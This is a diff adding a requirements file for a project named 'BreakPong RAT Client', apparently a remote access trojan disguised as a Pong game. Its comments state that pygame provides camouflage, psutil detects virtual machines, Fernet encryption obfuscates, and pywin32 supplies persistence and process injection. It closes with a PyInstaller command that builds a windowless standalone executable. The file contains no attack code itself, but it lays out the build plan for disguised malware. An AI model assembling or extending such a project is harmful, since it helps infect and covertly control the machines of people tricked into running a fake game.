@@ -1,0 +1,39 @@
+# BreakPong RAT Client Requirements
+# Python 3.7+ Required
+# Last Updated: 2024
+
+# === CORE DEPENDENCIES ===
+pygame==2.5.2              # Game engine para camuflaje
+psutil==5.9.8              # System monitoring y detección de VM
+cryptography==42.0.5       # Fernet encryption para ofuscación
+
+# === NETWORKING ===
+chardet==5.2.0             # Detección de encoding para comunicaciones
+asyncio==3.4.3             # Built-in en Python 3.7+, incluido por compatibilidad
+
+# === WINDOWS SPECIFIC ===
+# Instalar solo en sistemas Windows
+pywin32==306               # Windows API para persistencia y process injection
+                          # pip install pywin32 --only-binary :all:
+
+# === OPCIONAL - COMPILACIÓN ===
+# Para crear ejecutables standalone
+pyinstaller==6.3.0         # Windows executable generation
+# nuitka==1.9.7            # Alternative compiler (mejor performance)
+
+# === DESARROLLO/DEBUG ===
+# Solo para fase de desarrollo
+colorama==0.4.6            # Colores en terminal Windows
+pytest==8.0.0              # Unit testing
+pytest-asyncio==0.23.5     # Async testing
+
+# === NOTAS DE INSTALACIÓN ===
+# Windows:
+#   pip install -r requirements_rat.txt
+#
+# Linux:
+#   pip install -r requirements_rat.txt --no-deps pywin32
+#
+# Para compilación:
+#   pip install pyinstaller
+#   pyinstaller --onefile --noconsole --hidden-import=pygame --hidden-import=win32api RAT.py
